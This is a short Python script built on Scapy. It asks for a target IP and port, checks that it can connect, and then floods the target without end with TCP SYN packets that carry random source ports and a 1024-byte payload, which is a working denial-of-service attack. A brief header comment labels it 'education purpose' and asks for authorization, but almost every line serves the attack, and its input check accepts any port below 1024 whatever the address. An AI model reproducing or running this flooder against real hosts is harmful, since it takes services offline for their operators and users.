# @uthor Ravindra sai konna
# date 30/10/20
# TCP syn-flood
# education purpose
# request dont perform this on any running sites unless requested by authorized user 

from scapy.all import *
from scapy.layers.l2 import Ether
from scapy.layers.inet import IP,TCP

import socket as strongEnd

def pipeline_check(compromised_ip,compromised_ip_port):
    try:
        pipe = strongEnd.create_connection((compromised_ip,compromised_ip_port))
        if pipe is not None:
            print('done with socket creation !!')
            pipe.close()
            return True
        else:
            print('couldnt able to connect target !! \n *** check the ip and port address \n *** make sure to have internet connection in the running device ')
            return False    
    except OSError:
        pass
    return False


def craft_my_choclate(compromised_ip,compromised_ip_port):
    layer3 = IP(dst=compromised_ip)
    layer4 = TCP(sport=RandShort(),dport=compromised_ip_port,flags="S")
    loadingpay = Raw(b"r"*1024)

    return layer3 /layer4/ loadingpay

class Validation:
    
    def __init__(self, compromised_ip, 
    compromised_ip_port):
        self.compromised_ip = compromised_ip
        self.compromised_ip_port = compromised_ip_port

    def input_check(self):

      def isIPv4(s):
         try: 
             return str(int(s)) == s and 0 <= int(s) <= 255
         except: 
             return False

      def isIPv6(s):
         if len(s) > 4:
            return False
         try : 
             return int(s, 16) >= 0 and s[0] != '-'
         except:
            return False

      def validate_port(port):
          if port >=0 and port < 1024:
              return True
          else:
              return False
                       
      if self.compromised_ip.count(".") == 3 and all(isIPv4(i) for i in self.compromised_ip.split(".")):
         return True
      if self.compromised_ip.count(":") == 7 and all(isIPv6(i) for i in self.compromised_ip.split(":")):
         return True
      if validate_port(self.compromised_ip_port):
          return True   
      return False





pot_ip = input('ip..?')

pot_pot = int(input('port..?'))

validate = Validation(pot_ip,pot_pot)

cross_check = validate.input_check()

pipeline_check = pipeline_check(pot_ip,pot_pot)

if (cross_check and pipeline_check):
    send(craft_my_choclate(pot_ip,pot_pot), loop=1, verbose=0)

else:
    print ('oops come with proper inputs')
